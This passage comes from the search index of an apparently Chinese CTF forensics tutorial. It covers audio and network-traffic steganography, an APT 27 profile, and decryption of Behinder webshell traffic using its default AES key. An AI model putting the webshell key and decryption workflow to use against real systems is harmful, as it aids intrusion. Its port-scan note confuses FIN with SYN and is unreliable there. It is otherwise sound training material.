result = result ^ m ^ k\n        if result &gt;&gt; 256:\n            result = result ^ P\n\n    return result\n\n\ndef draw2pic(data):\n    if os.path.exists(\"pic_output\"):\n        print(\"[!] pic_output \u76ee\u5f55\u5df2\u5b58\u5728\")\n    else:\n        print(\"[+] pic_output \u76ee\u5f55\u521b\u5efa\u6210\u529f\")\n        os.mkdir(\"pic_output\")\n    length = len(data)\n    dic = {X: int(length / X)\n           for X in range(1, length) if length % X == 0}\n    for item in dic.items():\n        pos = 0\n        img = Image.new(\"RGB\", (item[0], item[1]))\n        for x in range(item[0]):\n            for y in range(item[1]):\n                if data[pos] == '0':\n                    img.putpixel([x, y], (0, 0, 0))\n                else:\n                    img.putpixel([x, y], (255, 255, 255))\n                pos += 1\n        img.save(f\"./pic_output/{item[0]}_{item[1]}.png\")\n        print(\n            f\"./pic_output/{item[0]}_{item[1]}.png Saved!\")\n\n\nif __name__ == \"__main__\":\n    P = 115792089237316195423570985008687907853269984665640564039457584007913129640997\n    flag1 = 'ThIs_Fl4g_Is_Ri9ht'\n    flag2 = 'Hey_Fl4g_Is_Not_HeRe'\n    encrypt2 = 0xec8d57d820ad8c586e4be0122b442c871a3d71cd8036c45083d860caf1793ddc\n    encrypt3 = 0xc40a0be335babcfbd8c47aa771f6a2ceca2c8638caa5924da58286d2a942697e\n    encrypt1 = open('encrypt.txt', 'r').read()\n    key2 = encrypt2 ^ libnum.s2n(flag1)\n    key3 = encrypt3 ^ libnum.s2n(flag2)\n    print(key2)\n    print(key3)\n    tmp = key3 - 233333333333\n    for i in range(0, 255):\n        tmp = generate(tmp, 0)\n    seed = tmp ^ key2\n    print('Found seed:', seed)\n    print('use seed generate key3:', generate(key2, seed)+233333333333)\n    tmp = key2 - 233333333333\n    for i in range(0, 255):\n        tmp = generate(tmp, 0)\n    key1 = tmp ^ seed\n    print('Found key1:', key1)\n    print('use key1 generate key2:', generate(key1, seed)+233333333333)\n    tmp1 = hex(int(encrypt1, 2))\n    tmp2 = '0x'+hex(key1)[2:]*22\n    pic_data = bin(int(tmp1, 16) ^ int(tmp2, 16))[2:]\n    draw2pic(pic_data)\n</code></pre> <p></p>"},{"location":"Misc/Chapter4/4-16/","title":"OGG/WAV \u5355\u8272\u56fe\u50cf\u9690\u5199","text":""},{"location":"Misc/Chapter4/4-16/#oggwav-\u5355\u8272\u56fe\u50cf\u9690\u5199","title":"OGG/WAV \u5355\u8272\u56fe\u50cf\u9690\u5199","text":"<p>\u201c120 LPM\u201d\u63d0\u793a\u6307\u7684\u662f\u5929\u6c14\u4f20\u771f\uff0c\u4e00\u79cd\u4f20\u8f93\u5355\u8272\u56fe\u50cf\u7684\u6a21\u62df\u6a21\u5f0f</p> <p>\u6709\u4e00\u4e2a\u540d\u4e3a Multimode \u7684 OS X \u5e94\u7528\u7a0b\u5e8f\u53ef\u7528\u4e8e\u5c06\u97f3\u9891\u8f6c\u6362\u56de\u539f\u59cb\u4f20\u771f\u56fe\u50cf</p> <p>\u4f46\u5b83\u53ea\u63a5\u53d7 WAV \u6587\u4ef6\u4f5c\u4e3a\u8f93\u5165\uff0c\u6240\u4ee5\u6211\u9996\u5148\u8f6c\u6362 <code>similar.ogg</code> \u4e3a <code>similar.wav</code> \u4f7f\u7528 Audacity</p> <p></p> <p>\u6b63\u6587\u5982\u4e0b\uff1a</p> <pre><code>section 1 of 1 of file rfax_man\nbegin 644 rfax_man\nh5sg60BSxwp62+57aMLVTPK3i9b-t+5pGLKyPA-FxxuysvFs+BT8+o0dVsM24\nhcZHRaWYEHRBGFGtqk-cMV7oqqQRzbobGRB9Kwc-pTHzCDSSMJorR8d-pxdqd\nhLWpvQWRv-N33mFwEicqz+UFkDYsbDvrfOC7tko5g1JrrSX0swhn64neLsohr\nh26K1mSxnS+TF1Cta8GHHQ-t1Cfp7nh-oZeFuVi5MEynqyzX8kMtXcAynSLQx\nhg4o56Pu4YUZHMqDGtczKeCwXU8PZEc4lY0FbDfFfgZpJFC-a-sHGLtGJgCMZ\nhksr6XNTedEUdVJqxOO5VaReoH68eEPJ2m6d9mKhlhVE7zw4Yru4DUWRCJH28\nhyeth+l2I0gPnEfrTLwAc+-TPS0YKYY3K0np58gVPgdAN8RY7+rQfRDin9JSa\nhPG32WG7-rTl3uthvrnDO-wD09GDIRCniuoefs8UsfiWZOLq+0awOrQxAPM+C\nhxLwOJ9VUKwdn7dJduLn1KhBucvL1pr5lGiBFfUbL79cFFex+G27kT+fsQ7X5\nh87mgPivWhDSQHKPXqpKGniDkYsIYpg66ZWbHp4PfcgtPukElDWENlQPSuNAQ\nhnboE4Bd8kyyokt67GgfGvBVS45sMFPtlgKRlG-QPFSgbMHujA3qYemxnuqGx\nhp97aXpdKpvAE8zx-oUzazoVFz32X3OxAuiWJhKEjaYKpM7f95yv1S62v+k++\n+\nend\nsum \u2014r/size 7468/769 section (from \"begin\" to \"end\")\nsum \u2014r/size 36513/540 entire input file\n</code></pre> <p>\u4f7f\u7528 XXdecoder \u89e3\u7801\u751f\u6210\u4e00\u4e2a\u540d\u4e3a \u7684\u6587\u4ef6 <code>rfax_man</code></p> <p></p> <pre><code>$ file rfax_man\nrfax_man: gzip compressed data, was \"rfax_man.py\", from FAT filesystem (MS-DOS, OS/2, NT), last modified: Thu Feb  6 17:52:39 2014, max speed\n</code></pre> <p>\u89e3\u538b\u7f29\u662f\u4e00\u4e2a Python \u811a\u672c</p> <pre><code>import socket,os,sys,hashlib\n\nKEY  = \"CTF{4BDF4498E4922B88642D4915C528DA8F}\" # DO NOT SHARE THIS!\nHOST = '109.233.61.11'\nPORT = 8001\n\nif len(sys.argv)&lt;3:\n  print 'Usage: rfax_man.py add|del file.png'\n  print '\\nAdd your pictures to transmission!\\nSizes: 800&lt;=width&lt;=3200 and height/width &lt;= 2.0.\\nUse contrast grayscale pictures.'\n  sys.exit(0)\n\ndata=open(sys.argv[2],'rb').read(1000000)\n\nm=hashlib.md5(); m.update(KEY); KEYH=m.hexdigest().upper()\nm=hashlib.md5(); m.update(data); h=m.hexdigest().upper()\nprint 'File hash',h\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((HOST, PORT))\nprint 'Connected.'\n\nif sys.argv[1]=='add':\n  s.sendall(KEYH+':ADD:'+data)\n  s.shutdown(socket.SHUT_WR)\n  print s.recv(1024)\nelif sys.argv[1]=='del':\n  s.sendall(KEYH+':DEL:'+h)\n  print s.recv(1024)\n\ns.close()\nprint 'Done.'\n</code></pre>"},{"location":"Misc/Chapter4/4-17/","title":"MP3 \u539f\u7248\u6807\u5fd7\u4f4d\u9690\u5199","text":""},{"location":"Misc/Chapter4/4-17/#mp3-\u539f\u7248\u6807\u5fd7\u4f4d\u9690\u5199","title":"MP3 \u539f\u7248\u6807\u5fd7\u4f4d\u9690\u5199","text":"<p>\u6570\u636e\u5e27\u5206\u6790\u53c2\u8003\u535a\u5ba2</p> <p>\u91cd\u70b9\u5728\u8fd9\uff0cMP3 \u7684\u6570\u636e\u5e27\u7b2c\u56db\u5b57\u8282\u5012\u6570\u7b2c\u4e09\u4f4d\u4e3a\u539f\u7248\u6807\u5fd7</p> <p></p> <p>\u53ef\u4ee5\u5728 010 \u7684 template Results \u7a97\u53e3\u53f3\u952e\u5c06\u7ed3\u6784\u6570\u636e\u5bfc\u51fa\u5230 csv \u6216\u8005xml \u6587\u4ef6\uff0c\u7136\u540e\u4f7f\u7528\u811a\u672c\u8bfb\u53d6</p> <p></p> <pre><code>import pandas as pd ,numpy as np,matplotlib.pyplot as plt,cv2 \ntr = pd.read_csv('z:/ctf/fox01.csv')\nmp3 = open('z:/ctf/fox01.mp3','rb').read()  \norg =''.join([' ' if mp3[int(i['Start'][:-1],16)+3] &amp;4 == 0 else '8' for _,i in tr[tr['Name'].str.startswith('struct MPEG_FRAME')].iterrows()])\nprint(org)\n</code></pre> <p>\u540c\u6837\u7c98\u8d34\u5230\u6587\u672c\u7f16\u8f91\u5668\u91cc\u9762\uff0c\u9009\u62e9\u5408\u9002\u7684\u5bbd\u5ea6\uff0c\u7ed3\u679c\u5c31\u662f\u4e0b\u9762\u8fd9\u6837</p> <p></p>"},{"location":"Misc/Chapter4/4-2/","title":"\u6ce2\u5f62\u9690\u5199\uff08Wav\uff09","text":""},{"location":"Misc/Chapter4/4-2/#\u6ce2\u5f62\u9690\u5199wav","title":"\u6ce2\u5f62\u9690\u5199\uff08Wav\uff09","text":"<p>\u6ce2\u5f62\u9690\u5199\u539f\u7406\u5c31\u662f\u5c06\u6ce2\u5f62\u7684\u9ad8\u4f4e\u8f6c\u4e3a\u4e8c\u8fdb\u5236 </p> <p>\u4e0b\u8f7d\u6587\u4ef6\u540e\u662f\u4e00\u6bb5 WAV \u97f3\u9891\uff0c\u653e\u5165\u5de5\u5177 Audacity \u4e2d\u770b\u6ce2\u5f62\u56fe</p> <p></p> <p>\u53ea\u6709\u4e24\u79cd\u683c\u5f0f\u5373\u5206\u522b\u5bf9\u5e94\u4e8c\u8fdb\u5236 0\u30011\uff0c\u5199\u811a\u672c\u8dd1\u4e00\u4e0b</p> <pre><code>import wave\nimport numpy as np\n\ndef main():\n    wavfile = wave.open('music.wav', \"rb\")\n\n    # \u83b7\u53d6 WAV \u6587\u4ef6\u7684\u53c2\u6570\n    params = wavfile.getparams()\n\n    # \u83b7\u53d6\u97f3\u9891\u7684\u91c7\u6837\u70b9\u6570\n    nframes = params[3]\n\n    # \u4ece WAV \u6587\u4ef6\u4e2d\u8bfb\u53d6\u6240\u6709\u5e27\u7684\u6570\u636e\n    datawav = wavfile.readframes(nframes)\n\n    wavfile.close()\n\n    # \u5c06\u8bfb\u53d6\u7684\u4e8c\u8fdb\u5236\u6570\u636e\uff08datawav\uff09\u8f6c\u6362\u4e3a\u4e00\u4e2a NumPy \u6570\u7ec4\uff0c\u6570\u636e\u7c7b\u578b\u4e3a\u77ed\u6574\u578b\uff08np.short\uff09\n    datause = np.frombuffer(datawav, dtype=np.short)\n\n    result_bin = ''\n\n    # \u8bb0\u5f55\u5f53\u524d\u7684\u6700\u5927\u503c\n    mx = 0\n\n    # \u5faa\u73af\u904d\u5386 datause \u6570\u7ec4\uff0c\u9664\u4e86\u6700\u540e\u4e00\u4e2a\u5143\u7d20\n    for i in range(len(datause) - 1):\n        # \u66f4\u65b0\u8bb0\u5f55\u6700\u5927\u503c\u7684\u53d8\u91cf mx\n        if datause[i] &gt; mx:\n            mx = datause[i]\n\n        # \u68c0\u67e5\u5f53\u524d\u5143\u7d20\u662f\u5426\u4e3a\u8d1f\u6570\u4e14\u4e0b\u4e00\u4e2a\u5143\u7d20\u4e3a\u975e\u8d1f\u6570\n        # \u5982\u679c\u662f\uff0c\u8fd9\u610f\u5473\u7740\u97f3\u9891\u6ce2\u5f62\u4ece\u8d1f\u6570\u8de8\u8d8a\u52300\u6216\u6b63\u6570\uff0c\u8fd9\u53ef\u80fd\u662f\u9690\u85cf\u6570\u636e\u7684\u6807\u8bb0\u70b9\n        if datause[i] &lt; 0 &lt;= datause[i + 1]:\n\n            # \u68c0\u67e5\u4ece\u8d1f\u6570\u5230\u975e\u8d1f\u6570\u7684\u8de8\u8d8a\u662f\u5426\u8db3\u591f\u5927\uff08\u5927\u4e8e24000\uff09\n            # \u7528\u4e8e\u533a\u5206\u9690\u85cf\u6570\u636e\u4f4d\u662f '1' \u8fd8\u662f '0' \u7684\u9608\u503c\n            if mx - 24000 &gt; 0:\n                result_bin += '1'\n\n                mx = datause[i + 1]\n            else:\n                result_bin += '0'\n\n                mx = datause[i + 1]\n\n\n    result_hex = ''\n\n    # \u5c06\u4e8c\u8fdb\u5236\u6570\u636e\u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236\n    for i in range(0, len(result_bin), 4):\n        result_hex += hex(int(result_bin[i: i + 4], 2))[2:]\n\n    print(result_hex)\n\n\nif __name__ == '__main__':\n    main()\n</code></pre> <p>\u6700\u540e\u8dd1\u51fa\u6765\u662f\u4e00\u4e2a RAR \u6587\u4ef6\uff08\u770b\u6587\u4ef6\u5934\uff09</p> <p></p>"},{"location":"Misc/Chapter4/4-3/","title":"\u97f3\u9891\u5012\u653e\u9690\u5199","text":""},{"location":"Misc/Chapter4/4-3/#\u97f3\u9891\u5012\u653e\u9690\u5199","title":"\u97f3\u9891\u5012\u653e\u9690\u5199","text":"<p>\u6253\u5f00 Audacity \u53cd\u8f6c\u5373\u53ef</p> <p></p>"},{"location":"Misc/Chapter4/4-4/","title":"\u9891\u8c31\u56fe\u9690\u5199","text":""},{"location":"Misc/Chapter4/4-4/#\u9891\u8c31\u56fe\u9690\u5199","title":"\u9891\u8c31\u56fe\u9690\u5199","text":"<p>\u5728 Audacity \u4e2d\u6253\u5f00\u6587\u4ef6\uff0c\u6253\u5f00\u591a\u89c6\u56fe</p> <p></p> <p>\u6709\u7ec6\u6709\u7c97\uff0c\u5206\u522b\u5bf9\u5e94\u6469\u65af\u5bc6\u7801 . -</p> <p>\u6469\u65af\u5bc6\u7801\u89e3\u7801\u5373\u53ef\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter4/4-5/","title":"SSTV \u9690\u5199","text":""},{"location":"Misc/Chapter4/4-5/#sstv-\u9690\u5199","title":"SSTV \u9690\u5199","text":"<p>\u9996\u5148\u6253\u5f00\u865a\u62df\u58f0\u5361 VirtualAudioCable</p> <p></p> <p>\u518d\u6253\u5f00 RX-SSTV \u64ad\u653e\u97f3\u9891\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter4/4-6/","title":"\u6309\u952e\u5f0f\u7535\u8bdd\u9690\u5199","text":""},{"location":"Misc/Chapter4/4-6/#\u6309\u952e\u5f0f\u7535\u8bdd\u9690\u5199","title":"\u6309\u952e\u5f0f\u7535\u8bdd\u9690\u5199","text":"<p>\u5728\u7ebf\u7f51\u7ad9 DTMF \u68c0\u6d4b\u6f14\u793a</p> <p></p> <p>\u6700\u540e\u89e3\u7801\u5373\u53ef</p> <p></p>"},{"location":"Misc/Chapter4/4-7/","title":"SilentEye \u9690\u5199\uff08\u97f3\u9891\uff09","text":""},{"location":"Misc/Chapter4/4-7/#silenteye-\u9690\u5199\u97f3\u9891","title":"SilentEye \u9690\u5199\uff08\u97f3\u9891\uff09","text":"<p>\u4e00\u822c\u5728\u4f7f\u7528\u8fd9\u5de5\u5177\u60c5\u51b5\u4e0b\u662f\u56e0\u4e3a\u5b83\u7684\u97f3\u9891\u6ca1\u6709\u9690\u5199\uff0c\u4f7f\u7528\u5de5\u5177\u6253\u5f00\u6587\u4ef6\u89e3\u5bc6\u62ff\u5230\u5bc6\u7801</p> <p></p>"},{"location":"Misc/Chapter4/4-8/","title":"DeepSound \u9690\u5199\uff08Key\uff09","text":""},{"location":"Misc/Chapter4/4-8/#deepsound-\u9690\u5199key","title":"DeepSound \u9690\u5199\uff08Key\uff09","text":"<p>\u63a5\u4e0a\u4e00\u8282\u62ff\u5230\u4e86\u5bc6\u7801\uff0c\u60f3\u5230\u8981\u7528\u5bc6\u7801\u52a0\u5bc6\u7684\u5de5\u5177</p> <p>\u4f7f\u7528 DeepSound \u5de5\u5177\u6253\u5f00\u6587\u4ef6\uff0c\u8f93\u5165\u5bc6\u7801</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter4/4-9/","title":"Velato \u7f16\u8bd1\u9690\u5199\uff08Mid\uff09","text":""},{"location":"Misc/Chapter4/4-9/#velato-\u7f16\u8bd1\u9690\u5199mid","title":"Velato \u7f16\u8bd1\u9690\u5199\uff08Mid\uff09","text":"<p>MIDI \u6587\u4ef6\u4f18\u5148\u8003\u8651 Velato \u7f16\u8bd1</p> <p>Velato \u662f\u4e00\u79cd\u7f16\u7a0b\u8bed\u8a00\uff0c\u4f7f\u7528 MIDI \u6587\u4ef6\u4f5c\u4e3a\u6e90\u4ee3\u7801\uff0c\u97f3\u7b26\u6a21\u5f0f\u51b3\u5b9a\u547d\u4ee4</p> <pre><code>Vlt.exe music.mid\n</code></pre> <p></p> <p>\u63a5\u7740\u8fd0\u884c\u7f16\u8bd1\u597d\u7684\u6587\u4ef6\uff0c\u5c06\u8fd9\u6bb5\u5b57\u7b26\u89e3\u5bc6\u5373\u53ef\u62ff\u5230 flag</p> <pre><code>music.exe\n</code></pre> <p></p>"},{"location":"Misc/Chapter5/","title":"Index","text":""},{"location":"Misc/Chapter5/#apt-27","title":"APT 27","text":"<p>APT 27 \u662f\u4e00\u4e2a\u9ed1\u5ba2\u7ec4\u7ec7\uff0c\u5176\u7f51\u7edc\u653b\u51fb\u884c\u52a8\u6700\u65e9\u53ef\u8ffd\u6eaf\u81f32010\u5e74</p> <p>\u8be5\u7ec4\u7ec7\u88ab\u897f\u65b9\u6000\u7591\u662f\u4e2d\u56fd\u7528\u6765\u9488\u5bf9\u897f\u65b9\u653f\u5e9c\u53d1\u52a8\u653b\u51fb\u7684\u4e2d\u56fd\u9ed1\u5ba2\u7ec4\u7ec7\u3001\u53d7\u5230\u4e2d\u56fd\u5b98\u65b9\u652f\u6301</p> <p>\u8be5\u7ec4\u7ec7\u66fe\u5bf9\u5168\u7403\u6570\u767e\u4e2a\u7ec4\u7ec7\uff0c\u5305\u62ec\u7f8e\u56fd\u56fd\u9632\u627f\u5305\u5546\u3001\u91d1\u878d\u670d\u52a1\u516c\u53f8\u3001\u6b27\u6d32\u65e0\u4eba\u673a\u5236\u9020\u5546\u4ee5\u53ca\u4e00\u5bb6\u6cd5\u56fd\u80fd\u6e90\u7ba1\u7406\u516c\u53f8\u5728\u7f8e\u56fd\u7684\u5b50\u516c\u53f8\u53d1\u52a8\u8fc7\u653b\u51fb 2018 \u5e74 6 \u6708 13 \u65e5\uff0c\u5361\u5df4\u65af\u57fa\u5b9e\u9a8c\u5ba4\u7684\u7814\u7a76\u4eba\u5458\u53d1\u8868\u6587\u7ae0\u8868\u793a\uff0c\u5176\u5728\u540c\u5e743\u6708\u4efd\u53d1\u73b0\u4e86\u4e00\u8d77\u9488\u5bf9\u67d0\u4e2d\u4e9a\u56fd\u5bb6\u6570\u636e\u4e2d\u5fc3\u7684\u6301\u7eed\u6027\u7f51\u7edc\u95f4\u8c0d\u6d3b\u52a8\uff0c\u76ee\u6807\u662f\u5728\u8be5\u56fd\u7684\u653f\u5e9c\u7f51\u7ad9\u4e0a\u5b9e\u65bd\u6c34\u5751\u653b\u51fb\uff0c\u4ee5\u83b7\u53d6\u5e7f\u6cdb\u7684\u653f\u5e9c\u8d44\u6e90\uff0c\u5176\u653b\u51fb\u884c\u52a8\u6700\u65e9\u53ef\u8ffd\u6eaf\u81f32017\u5e7411\u6708\u4e2d\u65ec\uff0c\u5e76\u8ba4\u4e3a\u8be5\u884c\u52a8\u51fa\u81ea APT 27 \u4e4b\u624b</p> <p>2019 \u5e74 4 \u6708\uff0c\u6d3e\u62d3\u7f51\u7edc Unit 42 \u53d1\u73b0 APT 27 \u5229\u5229\u7528\u4e86\u5fae\u8f6f SharePoint \u7684\u6f0f\u6d1e CVE-2019-0604 \u5728 Sharepoint \u670d\u52a1\u5668\u4e0a\u5b89\u88c5 China Chopper webshell \u6765\u653b\u51fb\u4e2d\u4e1c\u4e24\u4e2a\u653f\u5e9c\u7ec4\u7ec7</p> <p>\u636eSecNews\u4e8e2019\u5e745\u670830\u65e5\u7684\u62a5\u9053\uff0c\u5176\u4ee5\u68c0\u6d4b\u5230APT 27\u4ee5\u5927\u578b\u4f01\u4e1a\u7f51\u7edc\u4e3a\u76ee\u6807\uff0c\u5bf9 MySQL \u670d\u52a1\u5668\u8fdb\u884c\u4e8615,000\u6b21\u653b\u51fb</p> <p>2022\u5e741\u670826\u65e5\uff0c\u5fb7\u56fd\u8054\u90a6\u5baa\u6cd5\u4fdd\u536b\u5c40\u8868\u793a\u9ed1\u5ba2\u7ec4\u7ec7APT 27\u5df2\u5bf9\u5fb7\u56fd\u7684\u5236\u836f\u548c\u79d1\u6280\u516c\u53f8\u53d1\u52a8\u6301\u7eed\u653b\u51fb\uff0c\u800c\u8be5\u5c40\u6b64\u524d\u4e8e2019\u5e74\u7684\u4e00\u4efd\u62a5\u544a\u4e2d\u8868\u793aAPT 27\u53e6\u6709\u522b\u540d\u4e3a**\u718a\u732b\u4f7f\u8005**\uff0c\u6697\u793aAPT 27\u542b\u6709\u4e2d\u56fd\u80cc\u666f\uff0c\u5e76\u8868\u793a\u8be5\u7ec4\u7ec7\u5bf9\u5916\u56fd\u4f7f\u9986\u548c\u5173\u952e\u9886\u57df\u6784\u6210\u5a01\u80c1</p> <p>2022\u5e748\u67083\u65e5\uff0c\u4e00\u4e2a\u81ea\u79f0\u662fAPT 27\u7ec4\u7ec7\u7684YouTube\u9891\u9053\u4e0a\u4f20\u58f0\u660e\u89c6\u9891\uff0c\u8868\u793a\u53d7\u4f69\u6d1b\u897f\u8bbf\u53f0\u5f71\u54cd\uff0c\u5c06\u5bf9\u53f0\u6e7e\u53d1\u52a8\u7279\u522b\u7f51\u7edc\u884c\u52a8\uff0c\u653b\u51fb\u76ee\u6807\u4e3a\u53f0\u6e7e\u7684\u653f\u5e9c\u7f51\u7ad9\u4e0e\u57fa\u7840\u8bbe\u65bd</p> <p></p>"},{"location":"Misc/Chapter5/5-1/","title":"TLS \u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-1/#tls-\u6d41\u91cf\u9690\u5199","title":"TLS \u6d41\u91cf\u9690\u5199","text":"<p>TLS\uff08Transport Layer Security\uff09\u662f\u4e00\u79cd\u5b89\u5168\u534f\u8bae\uff0c\u7528\u4e8e\u5728\u8ba1\u7b97\u673a\u7f51\u7edc\u4e0a\u5b9e\u73b0\u52a0\u5bc6\u901a\u4fe1</p> <p>TLS \u4f7f\u7528\u5bc6\u94a5\u4ea4\u6362\u7b97\u6cd5\u6765\u5b89\u5168\u5730\u751f\u6210\u4e00\u4e2a\u5171\u4eab\u7684\u4f1a\u8bdd\u5bc6\u94a5\uff0c\u8fd9\u4e2a\u4f1a\u8bdd\u5bc6\u94a5\u5c06\u7528\u4e8e\u672c\u6b21\u901a\u4fe1\u4f1a\u8bdd\u7684\u52a0\u5bc6\u548c\u89e3\u5bc6</p> <p>\u5e38\u89c1\u7684\u5bc6\u94a5\u4ea4\u6362\u7b97\u6cd5\u5305\u62ec RSA\u3001DH\u3001ECDH \u7b49 </p> <p>\u4e0b\u8f7d\u6587\u4ef6\u7ed9\u51fa\u4e86\u6d41\u91cf\u5305\u4ee5\u53ca\u52a0\u5bc6\u7684 key \u6587\u4ef6</p> <p>\u6253\u5f00 Key \u6587\u4ef6\u786e\u8ba4\u4e3a RSA \u5bc6\u94a5</p> <p></p> <p>\u4f7f\u7528 Wireshark \u6253\u5f00\u6d41\u91cf\u5305\u5bfc\u5165 RSA \u5bc6\u94a5</p> <p>\u7f16\u8f91\u27a1\u9996\u9009\u9879\u27a1RSA \u5bc6\u94a5\u27a1Add new keyfile\u27a1\u786e\u5b9a</p> <p></p> <p>\u9000\u51fa\u518d\u91cd\u65b0\u6253\u5f00\u5c31\u6709\u4e86\u89e3\u5bc6\u540e\u7684\u6570\u636e\u5305\uff0c\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter5/5-10/","title":"\u952e\u76d8\u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-10/#\u952e\u76d8\u6d41\u91cf\u9690\u5199","title":"\u952e\u76d8\u6d41\u91cf\u9690\u5199","text":"<p>\u6253\u5f00\u6d41\u91cf\u5305\u627e\u5230\u6570\u636e\u4f4d\u4e8e HID DATA \u4e2d</p> <p></p> <p>\u7f16\u5199\u811a\u672c\u63d0\u53d6\u6570\u636e</p> <pre><code>tshark -r 1.pcapng -T fields -e usbhid.data &gt; usbdata.txt\n</code></pre> <p></p> <p>\u6700\u540e\u5c06\u63d0\u53d6\u51fa\u7684\u6570\u636e\u7528\u811a\u672c\u8f6c\u4e3a\u6572\u51fb\u7684\u5b57\u6bcd\u5373\u53ef</p> <p></p>"},{"location":"Misc/Chapter5/5-11/","title":"\u51b0\u874e\u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-11/#\u51b0\u874e\u6d41\u91cf\u9690\u5199","title":"\u51b0\u874e\u6d41\u91cf\u9690\u5199","text":"<p>\u6253\u5f00\u6570\u636e\u5305\uff0c\u53ea\u6709 HTTP\uff0c\u8fc7\u6ee4\u4e00\u624b</p> <p></p> <p>\u8ffd\u8e2a\u4e0a\u4f20\u7684\u6728\u9a6c\uff0c\u53d1\u73b0\u5185\u5bb9\u88ab\u52a0\u5bc6\u4e86</p> <p></p> <p>\u4f46\u662f\u901a\u8fc7 Accept \u5206\u6790\u51fa\u8fd9\u662f\u51b0\u874e\uff08q=0.01\uff09</p> <p></p> <p>\u51b0\u874e\u4f7f\u7528 AES \u52a0\u5bc6\uff0c\u5bc6\u7801\u9ed8\u8ba4\u662f e45e329feb5d925b\uff0c\u8ffd\u8e2a\u4e00\u4e2a\u54cd\u5e94\u6d41\u89e3\u5bc6\u770b\u770b\u5185\u5bb9</p> <p></p> <p>\u89e3\u5bc6</p> <p></p> <p>\u518d\u89e3\u5bc6</p> <p></p> <p>\u53bb\u67e5\u770b\u8bf7\u6c42\u5305\u7684\u5185\u5bb9</p> <p></p> <p>\u53d1\u73b0\u5728\u8bf7\u6c42 secret2.txt\uff0c\u5176\u5185\u5bb9\u4e3a\uff1aHello, but what you're looking for isn't me.</p> <p>\u7ee7\u7eed\u67e5\u627e\uff0c\u627e\u5230\u5173\u952e\u5185\u5bb9</p> <p></p> <p>\u89e3\u5bc6\u5f97\u5230\u538b\u7f29\u5305</p> <p></p> <p>\u4fdd\u5b58\u51fa\u6765\uff0c\u4f7f\u7528 ZIP \u660e\u6587\u653b\u51fb\u5373\u53ef\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter5/5-12/","title":"TCP \u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-12/#tcp-\u6d41\u91cf\u9690\u5199","title":"TCP \u6d41\u91cf\u9690\u5199","text":"<p>\u6253\u5f00\u6d41\u91cf\u5305\u53ea\u6709 TCP</p> <p></p> <p>\u8ffd\u8e2a\u6570\u636e\u6d41\u662f\u4e00\u5f20\u56fe\u7247\uff0c\u5bfc\u51fa\u5373\u53ef\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter5/5-13/","title":"RTP \u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-13/#rtp-\u6d41\u91cf\u9690\u5199","title":"RTP \u6d41\u91cf\u9690\u5199","text":"<p>\u4e00\u5806 RTP \u6d41\uff0c\u76f4\u63a5\u5bfc\u51fa</p> <p></p> <p>\u4e4b\u540e\u53f3\u952e\u70b9\u5206\u6790 \u27a1 \u64ad\u653e\u6d41\u5ff5\u51fa flag</p> <p></p>"},{"location":"Misc/Chapter5/5-14/","title":"IP \u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-14/#ip-\u6d41\u91cf\u9690\u5199","title":"IP \u6d41\u91cf\u9690\u5199","text":"<p>\u6700\u540e\u53d1\u73b0\u9690\u5199\u5728 IP \u4e2d\u7684 Identification \u5b57\u6bb5</p> <p></p> <p>\u4f7f\u7528 tshark \u63d0\u53d6\u6570\u636e\u7136\u540e\u8f6c ASCII \u6700\u540e\u5728 Base91 \u89e3\u7801</p> <pre><code>tshark -r attachment.pacp -T fields -e ip.id &gt; data,txt\n</code></pre> <p></p>"},{"location":"Misc/Chapter5/5-15/","title":"HTTPS \u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-15/#https-\u6d41\u91cf\u9690\u5199","title":"HTTPS \u6d41\u91cf\u9690\u5199","text":"<p>\u7ed9\u4e86\u4e2a\u6d41\u91cf\u5305\u548c log \u6587\u4ef6</p> <p></p> <p>\u6253\u5f00\u6d41\u91cf\u5305\u53d1\u73b0\u90fd\u662f HTTPS</p> <p>\u5728\u914d\u7f6e\u9879\u4e2d\u4f7f\u7528 log \u6587\u4ef6\u89e3\u5bc6 TLS</p> <p></p> <p>\u8fd9\u4e2a\u65f6\u5019\u518d\u8fc7\u6ee4 HTTP \u5c31\u80fd\u770b\u5230\u6570\u636e\u4e86</p> <p></p> <p>\u8fc7\u6ee4\u72b6\u6001\u7801\u4e3a 200 \u7684\u6d4f\u89c8</p> <p></p> <p>\u53d1\u73b0\u53c2\u6570\u4e2d\u5b58\u5728\u9690\u5199\uff0c\u8fd9\u91cc\u662f\u5012\u8fc7\u6765\u7684\u9898\u76ee</p> <p>\u6570\u636e\u8f83\u5c11\u53ef\u4ee5\u624b\u52a8\u63d0\u53d6\u7136\u540e\u901a\u8fc7\u811a\u672c\u9006\u5411\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter5/5-16/","title":"\u7aef\u53e3\u626b\u63cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-16/#\u7aef\u53e3\u626b\u63cf\u9690\u5199","title":"\u7aef\u53e3\u626b\u63cf\u9690\u5199","text":"<p>\u7aef\u53e3\u626b\u63cf\u8981\u4e48 TCP \u8981\u4e48 UDP \u6216\u8005 ICMP</p> <p>\u9898\u76ee\u63d0\u793a Nmap \u7ecf\u5e38\u4f7f\u7528\u7684\u662f TCP\uff0c\u57fa\u4e8e TCP \u4e09\u6b21\u63e1\u624b\u626b\u63cf\u7aef\u53e3</p> <p>\u9996\u5148\u80af\u5b9a\u662f\u8fc7\u6ee4 FIN = 1\uff0c\u56e0\u4e3a\u8fd9\u662f\u7b2c\u4e00\u6b21\u63e1\u624b\u8bf7\u6c42\u5305</p> 